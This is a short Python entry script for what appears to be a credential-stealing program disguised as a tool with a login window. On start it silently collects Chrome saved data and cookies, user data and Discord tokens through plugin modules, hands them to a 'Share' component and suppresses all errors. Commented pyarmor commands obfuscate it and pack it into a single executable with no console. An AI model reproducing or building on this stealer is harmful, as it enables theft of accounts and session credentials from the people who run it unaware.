from plugins.chrome import Chrome
from plugins.user import User
from plugins.share import Share
from plugins.fprograms.auth import Auth
from plugins.discord import Discord

import PyQt5.QtWidgets
import sys

class Sin():
    def __init__(self):
        self.chrome = Chrome()
        self.user = User()
        self.discord = Discord()
        self.share = Share(self.chrome.grabbed,self.chrome.cookies,self.user.ud, self.discord.tokens)



#pyarmor pack -e " --onefile --hidden-import=pkg_resources.py2_warn" main.py
#pyarmor pack -e " --onefile --noconsole --hidden-import=pkg_resources.py2_warn" main.py
if __name__ == "__main__":
    try:
        Sin()

    except:
        pass
    app = PyQt5.QtWidgets.QApplication(sys.argv) 
    a = Auth()
    sys.exit(app.exec()) 
    #NitroSniper()